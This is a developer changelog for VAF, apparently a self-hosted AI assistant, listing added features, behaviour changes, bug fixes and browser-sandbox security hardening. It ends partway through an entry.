# Changelog

All notable changes to VAF are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and VAF aims to follow
[Semantic Versioning](https://semver.org/) (`MAJOR.MINOR.PATCH`, with PEP 440
prerelease suffixes such as `a0` / `b1` / `rc1`).

Each released version has a matching git tag `v<version>` and a GitHub Release.
To update an installed VAF, run `vaf update` (on Windows, from the install folder:
`run_vaf.bat update`).

## [Unreleased]

### Added
- **When you already have automations, VAF now offers to improve them instead of suggesting more.**
  Once there are three or more, a background check looks at the ones you have and raises one
  concrete, checked observation: an automation that has never completed, one that has recorded no
  success for a while, one that is disabled and forgotten, two scheduled at the same minute, or two
  with near-identical instructions. It proposes the change and leaves the decision to you - it
  cannot edit an automation itself. Automations now also
  keep a short record of their last runs, so "its last three runs ended with an error" becomes
  something VAF can actually tell you apart from "the machine was switched off".
- **VAF can now notice when something in the world affects a plan you told it about.** When there is
  nothing else to raise, a background check builds a short list from what it knows about your plans,
  deadlines and interests, looks up ONE of them, and gets in touch only if what it finds genuinely
  changes something for you - with the source, its date, and the search it ran. Saying nothing is the
  normal outcome, and a news summary is explicitly not one: this is not a digest. Such a notice is
  sent as information rather than a question, so it is never followed up or nudged, there is a
  three-day gap between notices, and the whole feature switches itself off if you turn down two of
  its last ten notices. Health is deliberately not one of the things it looks up.
- **A server install can now be chosen without a keyboard.** `./install.sh --server`
  (and `--desktop`) select the installation mode non-interactively, and the hosted
  one-liner forwards flags (`... | bash -s -- --server`), so provisioning scripts and
  remote installs can produce a server setup. Previously the choice existed only as an
  interactive prompt, which a piped install never saw.
- **Server installs now finish reachable.** A server install opens the OS firewall for
  the LAN port itself (scoped to the local subnet), enables Docker at boot so the memory
  system survives a restart, disables sleep/suspend so a repurposed desktop or laptop
  stays reachable, warns when the clock is not NTP-synced, and warns when the server's
  LAN address comes from DHCP (with the advice to give it a static IP or a router
  reservation). The provisioning lives in the new `vaf server provision` command and can
  be re-run at any time, for example after moving the server to another network.
- **Headless credential encryption can be set up during installation.** The server
  installer offers to set a master passphrase (Enter skips it); it is stored owner-only
  in `~/.vaf/service.env` and the service loads it automatically at start.
- **Immutable distributions are detected early.** On openSUSE MicroOS or Leap Micro the
  installer now stops at the very beginning with a clear message instead of failing
  halfway through the run. Support for these systems is planned; this only makes the
  current limitation honest.
- **`vaf top`: a live server dashboard in the terminal.** One self-refreshing view,
  headed by the Veyllo mark and hostname, with version, mode, the active provider and
  its actual model, the LAN addresses (hostname and IP URLs), host OS and uptime, the
  service process tree (PID, memory, CPU), live CPU/RAM/disk/GPU utilization, a
  network section with total up/down rates and the connected clients per IP, and the
  health of every Docker service - what an admin over SSH needs to see what the
  server is doing. `vaf top --once` prints a single snapshot for scripts.
- **The dashboard carries the live service log below it.** `vaf top` follows the
  service's output (the systemd journal in server mode, otherwise the newest known log
  file) in a pane that fills the rest of the terminal and resizes with the window. A
  tray started in a terminal or from the desktop entry now tees its own output into
  the service log so the pane can follow it; leftovers from earlier runs are not shown
  at all.
- **`vaf tray` and `vaf start` open the dashboard themselves in a terminal.** `vaf tray`
  runs the tray in the background and takes over the terminal with the live dashboard
  (Ctrl+C stops VAF, exactly like the old foreground run; `--no-top` restores the raw
  output), and `vaf start` opens the dashboard after starting (`--no-watch` suppresses
  it). Scripts, pipes, systemd and the crash supervisor keep the classic behavior.

### Fixed
- **A group chat's header now sits where a chat's header sits.** Opening an agent room
  used to leave the top band of the chat empty and put the room's name, kind, mission
  and members on a second bar underneath it. That bar now stands in the top band
  itself, next to the browser and specialist buttons, so a room looks like the chat it
  replaces. On a phone, where the app's own top bar carries the name, nothing changes.
- **The agent now remembers what its background check asked you, wherever you answer.**
  A question raised while you were away (for example on Telegram) used to live only in a
  small "waiting for a reply" slot, and any activity on your account could take that slot:
  a message you sent in an agent room was filed as your answer, and when you then actually
  replied on Telegram an hour later, the agent had no trace of ever asking and asked you
  what you meant. Two things changed. Only a message you send in your own chat counts as
  the answer now - not an agent-room message, a timer, a scheduled automation or the
  background check's own work. And every message a background check or an automation
  sends you is written into the transcript of the chat it was sent to, so the agent
  answering there has asked the question in its own history, even when you reply much
  later. An agent that was already on that chat picks the new message up on your next
  message instead of after the next chat switch.
- **A room joined from another machine no longer goes deaf for 90 seconds.** Reading
  straight after joining failed, and the guest had to wait out a minute and a half
  before the room answered at all. The cause sat one layer further out than it looked:
  the relay that carries a room connection kept the inner half open after the guest's
  first command had finished, so the room never learned the connection had ended and
  went on reserving the writing slot for it. Measured from a second machine on the
  same network: reading right after joining took ten seconds and failed, and now takes
  two tenths of a second and works.
- **A room that turns somebody away now says which refusal it was.** A wrong
  invitation, one already used, an unknown room and a slot already taken all reached
  the other machine as the same blank disconnection, so an agent on the far side had
  to guess which of the four had happened - and guessed wrong. Each now arrives with
  its own reason, immediately.
- **One bad message can no longer end voting in a room.** A vote carrying a closing time
  the room could not read as a number made every later attempt to count that room's votes
  fail, on every surface: the room view, the command line, and the check that closes a vote
  when its time is up. Because messages in a room are never edited or deleted, the effect
  was permanent. The closing time is now read carefully when it arrives and again when it
  is used, so an unusable one is simply ignored and the vote keeps working.
- **A malformed message to a room is now answered instead of dropping the connection.**
  Sending a room a message whose `ext`, `body` or `to` was not an object raised an
  unhandled error instead of being refused, and over a live room connection that ended
  the connection: the sender lost its line and never learned what had happened to the
  message. The room now names the field and refuses the message the way it refuses any
  other, so the sender gets an answer it can act on and stays connected.
- **A vote whose options were typed with a stray space could be counted under an answer
  nobody was offered.** The choice a member picked was matched against the options
  exactly, stored with the space, and then counted without it. Options and choices are
  now trimmed in the same place, so what is stored is what is counted.

### Added
- **Messages in a room can now carry proof of who wrote them.** Until now a room recorded
  the author by assigning it: the machine holding the room knew who was connected and
  wrote that down, which says nothing to anybody reading the conversation somewhere else.
  A participant that has a key on the machine it is using now signs what it says, and
  anyone holding the conversation can check it, on any machine, at any later time. This is
  optional and invisible: a room where nobody signs works exactly as before, a participant
  without a key keeps talking normally, and older software reads a signed conversation
  without noticing. A participant on another machine can also CHECK those signatures
  itself, with nothing installed beyond Python: the single-file client does the
  arithmetic locally rather than asking the machine that holds the room, which is the
  one party a check must not depend on. What it buys is bounded and worth saying
  plainly: whoever holds a room can still leave a message out, and can still change the
  ORDER in which things were said, but can no longer put words in somebody's mouth. What
  a message says is now checkable; when it was said is still a matter of trusting the
  machine that stores it. A participant on another machine can now also sign what IT
  says, and read its own messages back to check that the room still holds them
  unchanged - the half nobody could check before, and the one that matters most to
  whoever wrote them. A
  participant joining from another machine signs for itself or not at all - the machine
  hosting the room never signs on its behalf, because a proof produced by the very machine
  it is meant to hold to account would prove nothing.

### Changed
- **A room now settles a message's content in one place, and settles it the same way
  twice.** What a room may adjust about a submitted message (who it is addressed to, a
  ballot's choice, a vote's options) was spread over the room, the agent's room tool, the
  command line and the ingest path, each carrying its own copy of the same trimming rule.
  It is one step now, and that step is repeatable: asking a room what it will store and
  handing exactly that back changes nothing. This is what a sender needs before it can
  vouch for its own words, and the protocol document states it as a conformance item.

- **A background notice no longer stays silent for three days.** The gap between two
  "I looked this up and it affects you" messages was three days, on the assumption that it
  also stopped the same thing being reported twice. It never did that - a refused question is
  already kept out for 30 days, and a reworded repeat is caught before it is sent. So the gap
  was only ever about frequency, and three days is too long for something that concerns
  tomorrow. It is six hours now, and everything that prevents repeats is unchanged.
- **When VAF tells you something on its own and you reply, it now knows what you are replying
  to.** A background notice was deliberately marked "no answer expected" so it would not nag
  you about it - but that also removed the only note saying what had been sent, so a reply
  reached VAF with no idea what it referred to. Asked about its own researched message, it
  called it "just internal system info, nothing to do" and disowned it. Such a notice is now
  remembered like any other message it sends you, while still never being chased or repeated,
  and it is described to the answering agent as something it sent rather than as a question.
- **Answering "what's up?" to one of VAF's own questions now gets the question back, not a
  status report.** When VAF asked something in the background and the reply was "sorry, I'm
  here, what's up?", it read that as a request for a situation report and answered "all quiet,
  no open tasks" - dropping the question it had just asked. It now simply repeats what it
  asked and waits.
- **What VAF remembers about YOU is no longer buried under the documents it has read.** Every
  place that asks "what do I know about this person" - the profile block in every reply, and
  the background check that decides whether to raise something - searched one pile in which a
  single learned PDF outnumbers a year of personal notes. Measured on a real store: two thirds
  of everything stored was document text, and six of the eight memories fetched for "what are
  this user's plans and commitments" were pages out of a PDF. Those two lookups now leave
  document text out and return the same number of results, so the space goes to things about
  you. **Nothing else changed:** asking about a document still answers from the document, and
  every other lookup - chat memory, the search tool, the file and research agents, voice, mail,
  attachments - searches the whole store exactly as before.
- **When VAF reminds you about something and you ask "what?", it now knows what it meant.** A
  reminder is deliberately short ("shall we carry on with the commit - yes or no?"), and it used
  to REPLACE the actual question in VAF's own record. After one reminder nothing said what the
  topic had been, so answering the reminder with a question left VAF asking you back which
  message you meant, instead of simply saying what it was about. The subject is now kept
  alongside the reminder, a reminder has to carry what it is about, and the agent that picks up
  your reply is told the subject rather than only the last thing it sent you.
- **The server dashboard's log pane no longer garbles every line on Windows.** `vaf top`
  followed an appended log by splitting on the line feed alone, so on Windows - where a log
  written in text mode ends each line with a carriage return as well - every line it drew
  carried a stray carriage return. In a terminal that is not cosmetic: it sends the cursor
  back to the start of the line and overwrites what was just drawn. The backfill path was
  always correct; the two line splitters in the same component simply disagreed.
- **When you answer a question VAF asked a while ago, it now knows what you are answering.**
  If VAF asked something in the background (on your messenger, or in the chat) and you replied later
  than ten minutes, it had already forgotten the question and greeted you as if it had never asked -
  on Telegram and in the web chat alike. Waiting for an answer and remembering the question were the
  same thing, and both ended together. They are now separate: VAF stops chasing after ten minutes as
  before (no more nudges, no repeated escalation), but keeps the question itself for up to twelve
  hours, so a late answer is understood, replied to properly, and recorded against the question that
  prompted it.
- **A message VAF sends on its own no longer overwrites the answer above it in the chat.**
  When VAF asked something on Telegram, got no reply and followed up in the web chat, its
  "are you there?" appeared glued to the end of the previous turn while the reply you had
  already read disappeared into that turn's collapsed action list. The chat groups everything
  between two of your messages into one turn and shows the last part as the answer, and a
  message nobody asked for has no message of yours in front of it, so it was counted as part
  of the turn before it. Such messages - a thinking-run question, its follow-up, a fired timer
  and an automation result - now always stand on their own, in the live chat and after a
  reload, with their own time and their own avatar animation.
- **A background thinking run can no longer get stuck asking the same question.** When the
  agent had nothing concrete to suggest and fell back to a friendly get-to-know question,
  every attempt could be rejected as "too similar to one you already asked" - and the
  rejection told it to try again, with nothing counting the tries. One run made twelve
  attempts in a row and had to be stopped by hand. Four things changed: the similarity check
  now calibrates itself against the user's own recent questions instead of a fixed number
  (the old value sat below what the embedding model produces for *any* two questions in the
  same language, so nothing could ever pass); the retry limit moved to where the retries
  actually happen, so a question always goes out; the run always keeps a way to finish, even
  when the tool selection is narrowed; and a background run that is told it cannot look
  things up now gets an instruction it can actually follow instead of being asked to resolve
  an item that does not exist.
- **Web search no longer answers a background run with the user's own memory, and no longer
  carries a private chat line to the search engine.** Three things that were live whenever no
  Brave or Google API key is configured: the provider chain quietly fell back to VAF's own
  long-term memory and presented it as a search result, which is fine for a chat answer (it
  is labelled as memory) but useless to anything asking whether something has actually
  changed in the world - that path can now be refused. Every search also had the last message
  from the conversation attached and sent onward into page analysis; a background pass now
  searches for its own query only. And the shared search cache, which stores queries and
  results in clear text, is now separated per user - on a multi-user server one person's
  searches could previously be served to another.
- **Screenshots reached the browser agent's model as the words "Image[...]", not as
  pictures.** Every screenshot the browser agent ever obtained was passed on as a
  placeholder line describing an image instead of the image itself, so a model that was
  perfectly able to see never actually saw anything, and a text-only setup sent that
  same placeholder to the vision model and billed it as a look. Pictures now arrive as
  pictures, and an image the agent cannot read is dropped instead of being described in
  words to something that was asked to look at it.
- **The browser agent now actually looks at the page when it gets stuck.** With a
  vision-capable model it was handed a screenshot tool and left to ask for a picture
  itself, which is exactly what a model that has started to loop stops doing: it could
  retype into the same field for dozens of steps without ever seeing that the field had
  not taken the value. A run that stalls - a failed action, or the same action and page
  repeating - is now shown the current page unasked on the very next step, and a
  text-only browser model gets that page described to it instead. Runs are also told the
  rule that caused this: a value typed into an autocomplete is not committed until its
  suggestion is clicked.
- **The browser agent sees whenever anything else in VAF can see.** Its page
  descriptions and CAPTCHA reads used to require the optional Vision Model in
  Settings to be filled in explicitly, and answered "vision is not configured"
  otherwise - even when the main model accepts images perfectly well. They now use the
  same vision backend as the rest of VAF, which also means oversized screenshots are
  downscaled before they are sent, and a failed vision call no longer turns the
  provider's error text into what the agent believes it saw on the page. Browser
  screenshot descriptions are billed to the `vision` usage lane from now on, not to
  `browser`.
- **A background-started VAF no longer kills itself one second after starting.** The
  service's pid file shared its name with the local model backend's pid file, and the
  backend's orphan cleanup kills whatever pid it finds there when the model server does
  not answer - so the freshly started tray was "cleaned up" as its own orphan. The two
  files are separate now, a guard test keeps them that way, and the model backend refuses
  to kill a recorded process that is not actually a model server - which also protects
  installs that still carry an old, wrongly written record.
- **`vaf stop` and the dashboard now recognize the real service.** They identify it by the
  singleton port it holds instead of by its command line, so a dashboard watching VAF, an
  interactive `vaf run` session, or an unrelated shell that merely quotes the words can no
  longer be mistaken for the service (and killed). Leaving a dashboard also no longer
  deletes the record of a service that was restarted from another terminal meanwhile.
- **Terminal logging can no longer hang the tray.** If the log-mirroring thread failed to
  start, standard output stayed redirected into a pipe nobody read, and the tray plus all
  its children would block forever once that pipe filled. Output is only redirected once
  the reader is running, and an explicit `2>file` redirect is left alone.
- **A damaged activity record can no longer switch off proactive thinking for good.**
  If `last_interaction.json` was ever left truncated (for example by an interrupted
  write), every later attempt to record user activity silently failed and thinking
  mode stopped seeing idle users entirely, on every platform. The store now treats
  a corrupt file as empty and heals it with the next recorded interaction.
- **Windows: a failed firewall setup no longer retries into repeated error dialogs.**
  The guard meant to skip further `netsh` attempts after the first failure never
  actually engaged.

### Security
- **The browser's live picture is no longer open to any page on your machine.** The port
  that carries the browser's screen accepted a connection from anything on the computer,
  and unlike the browser's control port it did not even check where that connection came
  from, so a web page open in your ordinary browser could have watched along and typed
  into the sandbox browser's session. It now requires a password that only VAF knows,
  minted once and kept in the same protected store as the database password. The same
  attack was reproduced before and after: it connected before, and is refused now.
  Takes effect after a rebuild of the browser image; an existing container keeps running
  without the password until it is recreated, and the log says which of the two it is.
- **The browser's launch line now has its own alarm, and its crashes leave no
  residue.** The flag that hides Chromium's warning bar would also hide it for a
  genuinely dangerous flag, so a CI guard now forbids the dangerous ones outright;
  and both browser container lanes run under docker-init, so a crashing Chromium can
  no longer accumulate zombie processes in a long-lived container.
- **Saved browser logins are now encrypted on disk.** The per-user cookie store held
  live login tokens for every site a session was saved for, online banking included, in
  readable files. Those files now use the same encryption as chats and memories; stores
  written before the change are encrypted automatically at the next start, and a run
  that needs the file in the clear works on a short-lived, owner-only staging copy that
  is folded back encrypted when the run ends.
- **A browser user change now wipes the whole profile, provably, or refuses.** On the
  shared browser a change of hands used to run a quick cookie sweep whose deeper half
  silently fails on current Chromium, and any failure was only logged - the next person
  could inherit the previous person's live logins, history, saved passwords and autofill.
  Now every change of hands wipes the whole Chromium profile, VAF confirms the wipe
  actually happened before anyone gets the browser, and a wipe that cannot be confirmed
  refuses the handover outright and records a security event instead of proceeding. Two
  people asking for the browser at the same moment can no longer interleave their
  handovers either; the second one simply waits its turn.
- **The sandbox browser now runs Chromium with its own sandbox switched on.** It never
  was: the container could not create the namespaces Chromium's sandbox needs, so the
  browser ran with `--no-sandbox` and a malicious page that broke out of a renderer had
  the whole container. The blocker turned out to be Docker's default seccomp profile,
  nothing else, so the browser now starts with a profile that is Docker's default plus
  exactly the namespace calls the sandbox needs, and with all container capabilities
  dropped except the one Chromium's process broker requires. This applies to the shared
  browser and to every per-user browser alike, and needs one image rebuild plus a
  container recreate to take effect. On a runtime that does not apply the profile the
  browser falls back to the old behaviour and says so loudly in its log instead of
  refusing to start.

### Changed
- **The agent's own style sheet no longer teaches it the long dash.** The system prompt
  carried dozens of em and en dashes, and a model mirrors the typography it reads, so
  replies inherited them. The prompt is now dash-free, and a mangled umlaut in one of
  its German example sentences is repaired along the way.
- **Picking the interface language is now a search, not a scroll.** The language control
  under Settings, Interface used to be the browser's plain dropdown, which stops being
  comfortable the moment the list grows past a handful of entries. It now opens a popup
  in the middle of the screen with a search field: every language is listed with its own
  name and its English name, the active one carries a check mark, and typing narrows the
  list, accents not required, so "turkce" still finds Türkçe. The popup follows the light
  and dark theme like every other control, and arrow keys, Enter and Escape work as they
  do in a menu. The timezone under Date & time opens in the same popup, where searching
  earns its keep against the long list of zone names.
- **A reply may now be twice as long, and the limit is a setting.** How many tokens one
  answer could use was fixed at 8192, written into the code in three places, and no
  setting could reach it. That figure was sized for an answer, but a model that reasons
  spends it on thinking before it writes a word, so a long train of thought could eat the
  whole budget and the visible reply simply stopped mid sentence. The limit is now
  `api_max_response_tokens`, set to 16384. It can be raised further without risk: a
  provider whose own ceiling is lower refuses the figure once, the request is repeated
  immediately at a value known to work everywhere, and the lower figure is kept for the
  rest of the session, so no model can be broken by the setting.

### Added
- **Embedders can keep the memory lane and the grounded capability answer under their
  own persona.** A `system_prompt` override replaces the built-in persona wholesale and
  by design drops the two code-owned addenda that ride it. Both are now part of the
  public facade (`SOUL_CONTINUITY_ADDENDUM`, `build_capability_addendum`), so a support
  bot with its own voice and a trimmed tool set can re-add either one, with the
  capability text generated truthfully for exactly the tools it ships.
- **"What can you do?" now gets a real answer instead of a brochure.** Asked about its
  abilities, the agent used to be told only what NOT to say (no generic assistant
  self-description), so it often undersold itself. It now turns the question around:
  it asks what YOU want, says plainly that it adapts to you, and backs that up with
  what is actually true in the running session - the real number of tools it holds,
  that it can build a missing tool or skill itself, put a team of agents on one
  problem, and take standing orders that keep working without being asked again.
  Each of those claims is only made when the ability is really registered, so the
  answer never promises what the system would refuse.
- **Signing in and first-run setup now speak your language too.** The onboarding wizard was
  translated, but the screens around it were not: the boot screen, the unreachable-backend
  notice, the whole login form and the two-factor step were fixed English, and so were the
  error messages that appear during setup. A reader who had just picked their language in
  step one was thrown back to English the moment anything went wrong. All of it now comes
  from the catalogue in every one of the seven languages, and the boot screen follows the
  browser's language since no choice has been made yet. The password eye buttons also had no
  name at all for a screen reader, and now do. The build refuses new untranslated text on
  this path, and holds the rest of the interface to the amount it already has, both for text
  on screen and for the error messages a handler builds when something goes wrong.
- **The interface now speaks Thai.** All 1747 message keys carry a Thai value, and ไทย can be
  picked in the onboarding language step and under Settings, Interface, Language. Thai needed
  the opposite of the rule Japanese needed: Thai is written without spaces between words, so a
  space is punctuation there rather than a word boundary, and it is required around anything
  written in another script. The build now checks that boundary, along with the politeness
  register, because Thai marks politeness structurally and the particles that usually carry it
  would make the app pick a gender for whoever is typing.
- **The Thai wording says where it is not certain.** As with the other language packs the
  terms are sourced per term from vendors that ship them, but Thai has far less of that to
  draw on: Microsoft does not translate its documentation into Thai at all, its Thai support
  pages were machine translated in every case checked, and there is no Thai language pack for
  the editor the other rounds used as evidence. The companion document therefore names six
  security terms and six counting words as coinages rather than presenting them as vendor
  practice, so a native reviewer knows exactly where to look first. One thing is left for you
  to decide: Thai defaults to the Buddhist era, so dates render as 2569 rather than 2026 until
  that is pinned deliberately.
- **The interface now speaks Korean.** All 1747 message keys carry a Korean value, and 한국어
  can be picked in the onboarding language step and under Settings, Interface, Language. Korean
  needed a rule the other languages did not: its particles are chosen by the last sound of the
  word in front of them, so a particle after a name or a count that is only known while the app
  is running cannot be picked in advance. Those places now carry both forms the way Korean
  products write them, and everywhere the word IS known, the single correct form is used
  instead. The build checks this, because it is invisible to anyone who does not read Korean.
- **The interface now speaks Japanese.** All 1747 message keys carry a Japanese value, and
  日本語 can be picked in the onboarding language step and under Settings, Interface,
  Language. As with Chinese, the wording is sourced per term from vendors that ship it, and
  the contested calls are written down with their reasons. Japanese needed its own typography
  rules rather than an adaptation of the Chinese ones, because on the rule that matters most
  the two are opposites: Chinese puts a space at every Latin boundary and Japanese forbids it.
  The one long-vowel policy that decides サーバー against サーバ is applied to every katakana
  term and checked by the build.
- **The interface now speaks Simplified Chinese.** All 1747 message keys carry a Chinese
  value, and 简体中文 can be picked in the onboarding language step and under Settings,
  Interface, Language; a browser set to Chinese selects it on its own. The wording is not a
  literal translation: every recurring term was taken from a vendor that actually ships it,
  weighting Chinese-native AI products over translated enterprise documentation, and the
  contested calls are written down with their reasons in a companion document. One of them
  is worth stating here: the audit chain is described as detecting tampering, not preventing
  it, because the standard Chinese term claims prevention and would have overstated what the
  chain does.
- **The interface now speaks Turkish.** Chat, settings, the security dashboard, mail and
  the first-run setup were available in German and English only. All 1747 message keys now
  carry a Turkish value as well, and Turkish can be picked in the onboarding language step
  and under Settings, Interface, Language; a browser set to Turkish selects it on its own.
  A guard fails the build if a key or a placeholder ever exists in one language and not the
  others, so the three catalogues cannot drift apart again.
- **The browser now keeps itself up to date.** The browser engine comes from Debian and
  was only ever as new as the day its image was first built; nothing afterwards would
  refresh it, so it silently aged, security fixes included. The stack start now rebuilds
  the browser image from a fresh base once it is older than a set number of days
  (Settings, Advanced, Browser pool: "Refresh the browser after", default 14), and the
  security dashboard's firewall card shows the engine version and the image age, turning
  amber when the refresh is overdue. A failed refresh never blocks the start; it lands in
  the security event log and the old browser keeps serving.
- **The browser pool can now be strict, and its fallbacks are visible.** When everyone's
  own browser is taken, the next person used to be handed the shared one without a word,
  and nothing anywhere recorded that two people had just started sharing a browser. Every
  such fallback now lands in the security event log, and a new admin setting (Settings,
  Advanced, Browser pool: "Never share a browser") turns the fallback into an honest
  "try again later" on every lane - for setups where sessions must never meet, such as
  company logins.
- **The usage log now says when a reply was cut short.** A model that runs out of output
  budget stops mid-thought, and until now nothing anywhere recorded that it had: the one
  place that saw it printed a line to the terminal, which nobody using the web interface
  ever sees. Every line in `logs/usage_*.log` now carries `cut=` with the provider's own
  reason whenever the output limit ended the response, and is left exactly as it was
  otherwise, so a line only changes when something really was cut off. Nothing acts on
  this yet, deliberately: it is recorded first so that how often it happens is a number
  rather than a guess.

### Fixed
- **The agent now understands "yes" and "no" in the languages it is set to.** When the agent
  asks whether it was really you speaking, it matches the answer against a word list per
  language. Thai, Chinese and Korean had no list of affirmations at all, Japanese had no list
  of denials, and the Thai and Chinese denial lists held the English words under their own
  language key, so they reported as translated while matching nothing anyone would actually
  write. In those languages the answer was quietly treated as ordinary chat and the question
  stayed open. All four are filled in and checked against the live parser, including that an
  ordinary sentence merely starting with the same syllables is still not taken as an answer.
  The build now refuses a shipped interface language that can say only one of the two.
- **Japanese and Chinese kanji are drawn in the right shapes from the first frame.** The page
  declared German until the interface finished loading, and because the same character can be
  drawn differently in Japanese, Chinese and Korean, a machine carrying a Chinese font painted
  Japanese text in Chinese letterforms for that moment. The page now states its language before
  it paints, alongside the theme it already restored there.
- **A label's colon now follows the language it is written in.** Seven places built a line by
  gluing an ASCII colon onto a translated label, so a Chinese screen read `最近出现: ` with the
  Western colon and spacing that Chinese typography does not use. The separator now comes from
  the message catalogue like any other string, and a guard fails the build if a component ever
  hardcodes one beside a translated string again.
- **A file path that names a root is refused everywhere now, not just where the host
  happens to notice.** A path handed in from outside - an upload, a folder to browse, a
  peer's file push - was checked for being absolute with the rule of the machine VAF runs
  on. A Windows-style path arriving at a Linux VAF was not recognised, and since Python
  3.13 a Unix-style path arriving at a Windows VAF is not recognised either, so instead
  of a clear refusal the name was quietly reinterpreted as a relative one: asking to
  write `\etc\notes.txt` created `etc/notes.txt` inside the folder. Nothing ever left
  the folder it was allowed to touch, so no file was exposed, but the caller was handed a
  different target than the one they named. Both spellings are now refused on every
  platform and Python version.
- **A browser container that cannot start now says why.** Setting the stream password
  to something shorter than six characters made the container stop with an entirely
  empty log: the tool that writes the password file refused, and its complaint went
  nowhere. It now names the problem and the minimum before it tries, and any other
  failure of that step is printed instead of discarded.
- **Saved logins survive again, so an agent can carry a session on.** Whether the
  browser offers to remember a password was a setting inside the browser, and that
  turned out to be no place for it: a single stray toggle had switched it off in the
  running browser, and since every change of hands now wipes the profile, the setting
  would be lost at each handover anyway. It is now fixed at the container level, where
  neither can reach it, together with address autofill. This is what lets an agent get
  past a login form when a session has expired, instead of stopping there. Card
  autofill stays off on purpose: a browser an agent can drive should not fill payment
  data into whatever form it opens. Note where saved passwords belong: on a personal
  browser, whose profile is that one person's - on the shared browser they are erased
  at every change of hands, by design.
- **The browser's phishing protection is switched on, and says when it cannot work.**
  Safe Browsing was dead three times over: the launch line disabled both the list
  updates and the background fetches they ride on, and Chromium's API keys never
  reached the process because the browser is started directly instead of through
  Debian's wrapper. All three are fixed, and the protection level is now pinned by
  policy so no profile reset can lose it. One honest limit remains, measured rather
  than assumed: Google refuses the shared key Debian ships, so the lists still do not
  arrive - set your own key (`VAF_BROWSER_GOOGLE_API_KEY`) and it works, and the
  container log says on every start which of the two states it is in. Until then
  phishing protection comes, as before, from the filtering DNS and the content
  blocker. Removing those flags also restored certificate-revocation updates.
- **A personal browser no longer keeps an outdated engine forever.** Each per-user
  browser was pinned for life to the image it was first created from, so the browsers
  people actually work in were the last to receive a security fix, while the shared
  one was rebuilt. A personal browser whose image has moved on is now replaced on next
  use; the saved logins and history live in a separate volume and come back with it.
- **A browser user change now also erases the cache and the certificate store.** The
  cleanup between two people wiped the browser profile but left two neighbouring
  folders untouched: the page cache, which still held the previous person's browsed
  pages (measured: 2.8 MB naming real sites), and the certificate database, which is
  where a client certificate and its private key live - the one leftover worse than a
  cookie. Both are wiped with the profile now, and the documentation that already
  claimed the cache was erased is true for the first time.
- **The desktop window can no longer lock itself out with an old login.** A login is
  valid for 24 hours, and a window that stayed connected past that point kept working
  until the next restart, then hammered the server with its expired token forever: the
  live connection was refused while ordinary requests from the same machine were still
  answered as the local admin, so the window never showed the login page, and after a
  few minutes with "no clients connected" the tray shut the whole stack down as idle.
  An expired token from the OWN machine is now treated like no token at all - the
  desktop window reconnects under the same local-admin policy every other request from
  the machine already got. Remote devices still log in freshly, and a forged token is
  still refused everywhere.
- **A hard stop can no longer brick a personal browser.** Chromium writes a lock file
  into its profile naming the machine and process that own it. A personal browser's
  profile lives on so its logins survive, and after a hard stop (a force-removed
  container, a host reboot) the stale lock met the next container's new hostname,
  which Chromium reads as "in use on another computer" and refuses forever - the
  instance relaunched in an endless loop, and every browser open first waited out its
  full health deadline before falling back to the shared browser, minutes instead of
  seconds. The launcher now clears the stale lock before each start; nothing is lost,
  because the supervisor already guarantees only one Chromium ever runs per container.
- **The browser cleanup works inside the hardened container.** The new hardening drops
  every container capability, which took down the very tools the user-change cleanup
  and the workspace mirror relied on: a root exec could no longer create the wipe
  marker in the browser user's home, and the mirror's copy-then-chown left files under
  the wrong owner. Both now work AS the browser user - the marker is the user's own
  file, and the mirror arrives as a tar stream unpacked inside the container - so no
  capability had to be given back. Found live: the very first browser open after the
  hardening was refused by the new fail-closed handover, exactly as designed.
- **The terminal no longer fills with a memory warning that could never resolve.** The
  headless runner warned and ran a cleanup every thirty seconds once the process passed
  2 GB, but with the embedding model deliberately kept loaded the process idles above
  that line, and the cleanup cannot hand freed memory back to the operating system, so
  the same warning repeated forever at a constant figure. The warning threshold now sits
  at 4 GB, above the normal footprint, and the aggressive cleanup that unloads models
  moved from 4 GB to 6 GB accordingly. A process that actually grows still gets both.
- **An answer is no longer displaced by the rounds that come after it.** When the agent
  finished answering while its task list still held open steps, it quietly continued
  working, and each continuation replaced the reply, on screen and in the returned text.
  So a long deliverable, a list built with the browser, a summary of mails, could end up
  overwritten by a short closing remark like a confirmation that the steps were done.
  Every answer that passed validation now stays part of the reply: later rounds add to
  it instead of replacing it, and the chat bubble keeps showing it while the agent works
  on. Turns with a single answer are byte-for-byte unchanged.
- **OpenAI's newest models can use tools again.** On `gpt-5.6` (luna, terra and sol) every
  turn in which the agent wanted to use a tool came back as an error and nothing happened.
  Those models only accept tools when the request says the model should not reason first,
  and VAF never said it. It does now, for that family and only on turns that actually carry
  tools, so a plain question, an image description or a summary still gets the model's full
  reasoning. The value is deliberately not sent to every model: the older `o1`/`o3`/`o4`
  models refuse it and would have broken in exactly the same way. A future model that
  refuses for the same reason is recognised from its own error message and the turn is
  repeated immediately instead of being lost. The trade-off is stated rather than hidden:
  on `gpt-5.6`, a turn that uses tools now runs without the model's internal reasoning
  step, which is what this endpoint allows.
- **The coding agent offered itself 130 tools and was refused for it.** It collected its
  tools by scanning the whole product and leaving out three by name, so everything VAF
  ever gained landed in front of it: 11 mail tools, 20 messenger tools, 9 for calendars
  and contacts. OpenAI accepts at most 128 tools in one request, so every OpenAI coder run
  was rejected on its first step, before writing a line. It now works from a list of the
  tools a coding agent actually builds with - files, code, git, shell, tests and looking
  things up - which brings the same request to 42. That includes driving a real browser through a page it just built (clicking, filling forms), so a page is tested for working, not merely for rendering. Two settings tune the list for anyone
  who needs something else, and the tools a run cannot work without can never be removed
  by mistake. The same change closed a quieter gap beside it: a tool an account was not
  allowed to use was still being shown to the model, and only refused at the moment it was
  called.
- **Hitting the provider's rate limit no longer loses the turn.** OpenAI allows this
  account 200,000 tokens per minute per model, and with the chat and the coding agent
  sharing that window it runs full. The refusal names its own remedy - down to "please
  try again in 186ms" - but VAF only understood one of the three places providers put
  that number, waited a flat second or two instead, gave up after two tries and showed
  the error. Now the named wait is read wherever it appears, respected with a little
  extra margin, and retried for up to a minute of provider-suggested waiting (the
  budget is a setting) before an error is ever shown. The coding agent honors the same
  budget: it used to abort the entire run on the first rate-limit response, however
  short the requested wait.
- **A rejected request no longer loops.** When the provider refused, the coding agent read
  the refusal as "too much history", threw the conversation away in three steps and asked
  again with the same request - one live run repeated an identical, hopeless request 64
  times, each one paid for, and ended without ever reporting why. It now stops after the
  three compression steps and reports what the provider actually said. Which it can do
  because the provider's answer is finally written down: the log recorded only that
  something failed, never the reason.
- **The coding agent could not start at all on any `gpt-5` model.** It builds its own
